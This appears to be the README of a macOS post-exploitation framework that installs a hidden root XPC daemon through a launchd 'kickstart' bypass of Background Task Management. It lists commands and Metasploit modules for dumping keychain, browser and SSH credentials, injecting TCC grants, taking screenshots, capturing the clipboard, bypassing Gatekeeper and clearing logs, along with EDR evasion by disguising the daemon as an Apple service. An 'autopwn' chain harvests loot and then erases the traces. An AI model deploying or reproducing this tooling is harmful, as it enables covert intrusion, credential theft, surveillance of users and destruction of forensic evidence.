# macOS XPC Post-Exploitation Framework

A macOS red team framework that deploys a persistent root XPC daemon via **BTM (Background Task Management) bypass**. Any unprivileged user can execute 31 privileged operations through Mach IPC — credential harvesting, TCC manipulation, surveillance, anti-forensics, and more.

Includes **19 Metasploit modules** with full automation and **EDR evasion** (dynamic naming, native APIs, zero logging, obfuscated selectors).

**Author:** Red in Pulse - Mr.Gedik
**Blog:** https://redinpulse.com/en/blog/macos-red-team-xpc-persistence
---

## Table of Contents

- [Vulnerability Chain](#vulnerability-chain)
- [Architecture](#architecture)
- [Quick Start](#quick-start)
- [Building](#building)
- [Deployment](#deployment)
- [Command Reference](#command-reference)
- [Modules](#modules)
- [Metasploit Integration](#metasploit-integration)
- [EDR Evasion](#edr-evasion)
- [Technical Details](#technical-details)
- [Cleanup](#cleanup)
- [Disclaimer](#disclaimer)

---


**Root Cause:** `launchctl kickstart` talks directly to launchd without consulting BTM. BTM's disposition is advisory, not enforced.

---

## Architecture

```
┌──────────────────────────────────────────────────┐
│  Metasploit (19 modules)                         │
│  cmd_exec("./client <service_name> <cmd>")       │
└────────────────────┬─────────────────────────────┘
                     │  Meterpreter / Shell
                     ▼
┌──────────────────────────────────────────────────┐
│  client (75KB, unprivileged, UID=501)            │
│  TTY → colored output | no TTY → JSON auto      │
│  argv: <service_name> <short_code> [args]        │
└────────────────────┬─────────────────────────────┘
                     │  XPC (Mach IPC)
                     ▼
┌──────────────────────────────────────────────────┐
│  daemon (96KB, root, UID=0, launchd domain)      │
│  Dynamic Mach service name (no static IoC)       │
│  Protocol QP: 31 methods (q0-q30)                │
│                                                  │
│  ┌────────┐ ┌────────┐ ┌────┐ ┌────────┐        │
│  │ Core   │ │ Broker │ │TCC │ │Identity│        │
│  │ q0-q3  │ │ q4-q5  │ │q6-8│ │ q9     │        │
│  ├────────┤ ├────────┤ ├────┤ ├────────┤        │
│  │ Spawn  │ │ Creds  │ │Surv│ │Network │        │
│  │q10-q12 │ │q13-q16 │ │q17 │ │q21-q22 │        │
│  │        │ │        │ │-20 │ │        │        │
│  ├────────┤ ├────────┤ ├────┤ ├────────┤        │
│  │AntiFor │ │ Recon  │ │    │ │        │        │
│  │q23-q26 │ │q27-q30 │ │    │ │        │        │
│  └────────┘ └────────┘ └────┘ └────────┘        │
└──────────────────────────────────────────────────┘
```

---

## Quick Start

```bash
git clone https://github.com/your-repo/xpc-framework.git
cd xpc-framework

# Build
make

# Deploy (one-time sudo)
sudo ./scripts/install.sh install

# Test (as normal user — no sudo)
SVC=com.test.smdprobe.daemon
./build/client $SVC i              # daemon info (uid=0)
./build/client $SVC e whoami       # returns "root"
./build/client $SVC e2             # EDR/AV detection
./build/client $SVC k1             # keychain dump
./build/client $SVC ss             # screenshot
```

---

## Building

```bash
make              # Build daemon (~92KB) + client (~72KB), arm64
make UNIVERSAL=1  # arm64 + x86_64 universal binaries (Intel targets)
make clean        # Remove build/
```

**Linked frameworks:**
- Daemon: Foundation, Security, CoreGraphics, ImageIO, AppKit, libsqlite3
- Client: Foundation

---

## Deployment

### Manual (install.sh)

```bash
sudo ./scripts/install.sh install     # Build + deploy + BTM bypass
sudo ./scripts/install.sh status      # Health check
sudo ./scripts/install.sh uninstall   # Clean removal
```

Uses static label `com.test.smdprobe.daemon`.

### Metasploit (dynamic naming — preferred)

```bash
msf6> use post/osx/manage/xpc_daemon_install
msf6> set SESSION 1
msf6> run
# [+] Generated label: com.apple.security.confighelper.a3f182
# [+] Daemon running as root!
```

Every deploy gets a unique Apple-like label. No static IoC.

---

## Command Reference

Usage: `./build/client <service_name> <code> [args...]`

TTY detected → colored output. No TTY (pipe/Metasploit) → JSON auto.

### Core

| Code | Description | Example |
|------|-------------|---------|
| `i` | Daemon info (uid, pid, hostname, model) | `client <svc> i` |
| `e` | Execute command as root | `client <svc> e id` |
| `r` | Read file as root | `client <svc> r /etc/sudoers` |
| `w` | Write file as root | `client <svc> w /tmp/proof data` |
| `sh` | Interactive root shell | `client <svc> sh` |

### Broker

| Code | Description | Example |
|------|-------------|---------|
| `b1` | Probe Mach service from root context | `client <svc> b1 com.apple.securityd` |
| `b2` | Probe all 15 known system services | `client <svc> b2` |

### TCC

| Code | Description | Example |
|------|-------------|---------|
| `t1` | Probe TCC-protected resources | `client <svc> t1` |
| `t2` | Dump TCC database (system + user) | `client <svc> t2` |
| `t3` | Insert TCC grant for any bundle | `client <svc> t3 com.evil.app kTCCServiceCamera` |

### Identity

| Code | Description | Example |
|------|-------------|---------|
| `id` | Code signing, entitlements, audit token | `client <svc> id` |

### Spawn (GK/AMFI Bypass)

| Code | Description | Example |
|------|-------------|---------|
| `s1` | Spawn binary from daemon context | `client <svc> s1 /usr/bin/id` |
| `s2` | Spawn with custom env vars | `client <svc> s2 /usr/bin/env DYLD_INSERT_LIBRARIES=/tmp/x.dylib` |
| `dq` | Remove quarantine xattr | `client <svc> dq /tmp/app x` |
| `inj` | Execute inline script as root | `client <svc> inj /bin/bash "whoami; id"` |

### Credentials

| Code | Description | API |
|------|-------------|-----|
| `k1` | Keychain item listing (services/accounts, System keychain — attributes only) | Security.framework `SecItemCopyMatching` |
| `k2` | Browser logins (Chrome URLs/usernames — v80+ passwords are AES-encrypted, not decrypted) + Safari history | sqlite3 C API |
| `k3` | SSH key harvest (all users' ~/.ssh/) | NSFileManager |
| `k4` | Wi-Fi network names (SSID) — secrets are ACL-protected in daemon context | Security.framework `SecItemCopyMatching` (AirPort) |

### Surveillance

| Code | Description | API |
|------|-------------|-----|
| `ss` | Screenshot capture | `CGDisplayCreateImage` via `dlsym` |
| `cb` | Clipboard content | `NSPasteboard` |
| `ps` | Process list with paths/UIDs | `proc_listallpids` + `proc_pidpath` (libproc) |
| `se` | Active login sessions | `who` + `w` |

### Network

| Code | Description | API |
|------|-------------|-----|
| `n1` | Full network enum (interfaces, ARP, routes, listening) | `getifaddrs` + shell |
| `n2` | BPF packet capture | `tcpdump` (max 30s) |

### Anti-Forensics

| Code | Description | Example |
|------|-------------|---------|
| `lc` | Clear logs (unified + audit + var/log) | `client <svc> lc all` |
| `ts` | Timestomp file | `client <svc> ts /tmp/file 202001011200` |
| `sr` | Secure shred (random + zero overwrite) | `client <svc> sr /tmp/secret` |
| `ch` | Clear shell history (all users) | `client <svc> ch` |

### Recon

| Code | Description | API |
|------|-------------|-----|
| `e1` | System enum (OS, CPU, memory, users, apps) | `sysctlbyname` (native) |
| `e2` | EDR/AV detection (14 products) | `proc_listallpids` (native) |
| `e3` | Persistence enum (LaunchDaemons/Agents/cron/BTM) | NSFileManager |
| `e4` | Security posture (SIP, Gatekeeper, FileVault, Firewall) | shell |

---

## Modules

### Module Detail: Native vs Shell

The daemon minimizes subprocess spawning to avoid ESF `ES_EVENT_TYPE_NOTIFY_EXEC` detection:

| Module | Methods | Implementation | Process Spawn |
|--------|---------|---------------|---------------|
| Core | q0 (info) | `sysctlbyname`, `gethostname` | None |
| Core | q1 (exec) | NSTask `/bin/sh` | Yes (by design) |
| Core | q2-q3 (read/write) | `NSData` file I/O | None |
| Broker | q4-q5 | `bootstrap_look_up` Mach API | None |
| TCC | q6-q8 | `sqlite3_open` / `sqlite3_exec` C API | None |
| Identity | q9 | `SecCodeCopySelf`, `SecTaskCreateFromSelf` | None |
| Spawn | q10-q12 | NSTask + `mkstemp` | Yes (by design) |
| Credentials | q13 (keychain) | `SecItemCopyMatching` | None |
| Credentials | q14 (browser) | sqlite3 C API (Chrome/Safari DB) | None |
| Credentials | q15 (SSH) | `NSFileManager` directory traversal | None |
| Credentials | q16 (Wi-Fi names) | `SecItemCopyMatching` (AirPort filter) | None |
| Surveillance | q17 (screenshot) | `CGDisplayCreateImage` via `dlsym` | None |
| Surveillance | q18 (clipboard) | `NSPasteboard` | None |
| Surveillance | q19 (processes) | `proc_listallpids` / `proc_pidpath` | None |
| Surveillance | q20 (sessions) | `who` + `w` | Yes |
| Network | q21 (enum) | `getifaddrs` + `arp`/`netstat` | Partial |
| Network | q22 (capture) | `tcpdump` | Yes |
| Anti-Forensics | q23-q26 | `open(O_TRUNC)`, `unlink`, `NSFileManager` | Partial |
| Recon | q27 (system) | `sysctlbyname`, `NSFileManager` | None |
| Recon | q28 (EDR) | `proc_listallpids` + path matching | None |
| Recon | q29 (persist) | `NSFileManager` directory listing | None |
| Recon | q30 (posture) | `csrutil`, `spctl`, `fdesetup` | Yes |

**Summary:** 21 of 31 methods are fully native (no subprocess). 10 use shell for specific operations.

---

## Metasploit Integration

### Setup

```bash
msf6> loadpath /path/to/xpc-framework/msf
```

### Modules

| Category | Module | Description |
|----------|--------|-------------|
| **manage** | `xpc_daemon_install` | Deploy daemon with dynamic naming + BTM bypass |
| **manage** | `xpc_daemon_uninstall` | Clean removal + optional log scrub |
| **manage** | `xpc_daemon_status` | Health check + diagnostics |
| **gather** | `xpc_system_enum` | Full system enumeration → loot |
| **gather** | `xpc_tcc_dump` | TCC database extraction → loot |
| **gather** | `xpc_broker_scan` | System XPC service mapping |
| **gather** | `xpc_identity_info` | Code signing + entitlements |
| **gather** | `xpc_keychain_dump` | Keychain credential harvest → loot + creds |
| **gather** | `xpc_browser_creds` | Chrome/Safari passwords → loot |
| **gather** | `xpc_ssh_keys` | SSH private key harvest → loot + creds |
| **gather** | `xpc_wifi_names` | Wi-Fi network name (SSID) enumeration → loot |
| **gather** | `xpc_screenshot` | Desktop screenshot → PNG loot |
| **gather** | `xpc_clipboard` | Clipboard content → loot |
| **gather** | `xpc_security_check` | EDR/AV detection + security posture |
| **escalate** | `xpc_tcc_grant` | Inject TCC permissions |
| **escalate** | `xpc_quarantine_bypass` | Remove GK quarantine |
| **escalate** | `xpc_log_clean` | Anti-forensics log cleaning |
| **escalate** | `xpc_unsigned_exec` | AMFI bypass code execution |
| **escalate** | `xpc_autopwn` | **Full automated chain** |

### Autopwn — Full Chain

```bash
msf6> use post/osx/escalate/xpc_autopwn
msf6> set SESSION 1
msf6> run

[*] ============================================================
[*] Phase 1: System Enumeration
[*] ============================================================
[*] Phase 2: Security Assessment
[+] No EDR/AV detected
[*] Phase 3: Credential Harvesting
[+] Keychain dumped → ~/.msf4/loot/...
[+] SSH keys harvested: admin, user1
[+] Wi-Fi network names → ...
[*] Phase 4: Access Mapping
[+] TCC database → ...
[+] 14 system services reachable
[*] Phase 5: Evidence Collection
[+] Screenshot (245760 bytes) → ...
[*] Phase 6: Covering Tracks
[+] Shell history cleared
[+] System logs cleared
[+] ============================================================
[+] AUTOPWN COMPLETE
[+] Loot items collected: 12
[+] Credentials found:    3

msf6> loot        # View all collected data
msf6> creds       # View extracted credentials
```

### Dynamic Naming Flow

```
Metasploit                        Target macOS
    │
    │  generate_label()
    │  → "com.apple.security.checker.a3f1"
    │
    ├─ upload daemon → /tmp/.random
    ├─ upload client → /tmp/.random
    ├─ cp daemon → /Library/PrivilegedHelperTools/<label>
    ├─ codesign -s - --identifier <label>
    ├─ generate plist at runtime (Label = <label>)
    │  ProgramArguments: [daemon_path, "<label>"]  ← argv[1]
    ├─ launchctl bootstrap system <plist>
    └─ launchctl kickstart -kp system/<label>       ← BTM bypass
                                    │
                              daemon main()
                              argv[1] → g_serviceName
                              NSXPCListener(<label>)
                                    │
                              client execution
                              ./client <label> k1
                              NSXPCConnection(<label>)
```

### JSON Output Format

No TTY (Metasploit `cmd_exec`) → automatic JSON:

```json
{"s":"1","c":"i","d":{"uid":0,"euid":0,"hostname":"Mac.local","label":"com.apple.security.checker.a3f1"}}
```

| Key | Type | Description |
|-----|------|-------------|
| `s` | `"1"` / `"0"` | Success / Error |
| `c` | string | Command code |
| `d` | dict/string/base64 | Response data |

---

## EDR Evasion

### Dynamic Daemon Naming

Every deployment generates a unique Apple-like label:

```
com.apple.security.confighelper.a3f182
com.apple.coreservices.syncagent.7b2e01
com.apple.private.validator.c9d4f3
```

Eliminates static YARA rules, hash-based detection, and `launchctl list` pattern matching.

### Zero Logging

No `syslog()`, `os_log()`, or `NSLog()` calls. Daemon produces zero entries in unified log.

### Native API Calls

Shell subprocess spawning creates `ES_EVENT_TYPE_NOTIFY_EXEC` events that EDR detects:

```
[DETECTED] root_daemon → /bin/sh → sqlite3 TCC.db
[DETECTED] root_daemon → /bin/sh → security dump-keychain
```

This framework uses in-process native APIs instead:

| Operation | Traditional (Detected) | This Framework (In-Process) |
|-----------|----------------------|----------------------------|
| TCC database | `/usr/bin/sqlite3` | `sqlite3_open()` C API |
| Keychain | `/usr/bin/security` | `SecItemCopyMatching()` |
| Wi-Fi network names | `/usr/bin/security find-generic-password` | `SecItemCopyMatching()` (AirPort) |
| Screenshot | `/usr/sbin/screencapture` | `CGDisplayCreateImage()` via `dlsym` |
| Clipboard | `/usr/bin/pbpaste` | `NSPasteboard` |
| Process list | `/bin/ps aux` | `proc_listallpids()` libproc |
| Network | `/sbin/ifconfig` | `getifaddrs()` |
| EDR detection | `/bin/ps aux \| grep` | `proc_listallpids()` |
| System info | `/usr/bin/sw_vers` | `sysctlbyname()` |
| File shred | `/bin/dd if=/dev/urandom` | `write()` + `unlink()` syscalls |
| History clear | `/bin/rm` | `NSFileManager` |

### Obfuscated Binary

All ObjC identifiers use generic short names:

```
Protocol: QP  (was HelperDaemonProtocol)
Class:    QI  (was HelperDaemonImpl)
Delegate: QD  (was DaemonDelegate)
Methods:  q0-q30 (was getInfoWithReply:, credKeychainDumpWithReply:, etc.)
Commands: i,e,r,w,sh,b1,b2,t1-t3,id,s1,s2,dq,inj,k1-k4,ss,cb,ps,se,n1,n2,lc,ts,sr,ch,e1-e4
```

Sensitive file paths are XOR-encoded (key=0x55) and decoded at runtime.

### TTY Auto-Detection

No `--json` or `--service` flags in binary. JSON mode activates automatically when stdout is not a TTY:

```c
g_json = !isatty(STDOUT_FILENO);
```

### IoC Comparison

| Indicator | Standard Tool | This Framework |
|-----------|--------------|----------------|
| Static daemon label | Hardcoded | Random per deploy |
| Syslog entries | Every operation logged | 0 |
| Subprocess spawns | 30+ per session | ~10 (core exec + anti-forensics only) |
| YARA-matchable strings | `keychain-dump`, `screenshot`, etc. | 0 |
| ObjC selector names | `credKeychainDumpWithReply:` | `q13:` |
| CLI flags | `--json`, `--service` | None (positional + auto-detect) |
| Temp file patterns | `/tmp/.xpc_*` | `mkstemp()` random |
| Plist file | Static, on disk | Generated at runtime |
| Binary hash | Same every time | Same binary, different codesign ID |

---

## Technical Details

### BTM Disposition Paradox

```
backgroundtaskmanagementd:
  registerLaunchItem: disposition = [enabled, allowed, not notified]  ← DB: ALLOWED
  effectiveItemDisposition: appURL = (null)                          ← No parent app
  getEffectiveDisposition: [enabled, disallowed, notified]           ← Effective: BLOCKED

launchctl kickstart: ignores BTM → daemon starts as root
```

### Process Context Separation

System services see the **daemon's** identity, not the client's:
- UID 0 (root)
- Daemon's audit token
- Daemon's code signing identity
- Daemon's entitlements

### Persistence

- `KeepAlive: true` — launchd restarts on crash
- `RunAtLoad: true` — starts at boot
- `/Library/LaunchDaemons/` — not SIP-protected

### macOS 15 Compatibility

`CGDisplayCreateImage` is marked unavailable in macOS 15 SDK. The framework loads it at runtime via `dlsym()`, bypassing the compile-time restriction while the API still functions.

### Detected EDR/AV Products (e2 module)

CrowdStrike Falcon, SentinelOne, Carbon Black, Microsoft Defender, Sophos, ESET, Malwarebytes, Little Snitch, LuLu, BlockBlock, Jamf, Kandji, osquery, Santa

---

## Cleanup

```bash
# Manual install
sudo ./scripts/install.sh uninstall

# Metasploit install (use the label from deployment)
msf6> use post/osx/manage/xpc_daemon_uninstall
msf6> run

# Or manually with dynamic label
sudo launchctl bootout system/<label>
sudo rm /Library/PrivilegedHelperTools/<label>
sudo rm /Library/LaunchDaemons/<label>.plist
```

---

## Project Structure

```
xpc-framework/
├── Makefile                              Build system
├── scripts/
│   └── install.sh                        Manual deployment
├── src/
│   ├── daemon/
│   │   ├── helper_protocol.h             Protocol QP (31 methods)
│   │   ├── helper_daemon.m               Root daemon QI (985 lines)
│   │   ├── helper_daemon_info.plist      Embedded Info.plist
│   │   └── helper_daemon_launchd.plist   Static plist (manual mode)
│   └── client/
│       └── helper_client.m              Client (650 lines)
├── msf/
│   ├── lib/
│   │   └── xpc_helper.rb                Shared library (242 lines)
│   └── modules/post/osx/
│       ├── manage/    (3 modules)        install, uninstall, status
│       ├── gather/    (11 modules)       enum, TCC, creds, surv, network
│       └── escalate/  (5 modules)        TCC grant, GK bypass, autopwn
└── build/
    ├── daemon                            ~92 KB
    └── client                            ~72 KB
```

---

## Disclaimer

This tool is intended for **authorized security testing, red team engagements, and security research only**. Use only on systems you own or have explicit written authorization to test. Unauthorized access to computer systems is illegal.

---

**Author:** Red in Pulse - Mr.Gedik
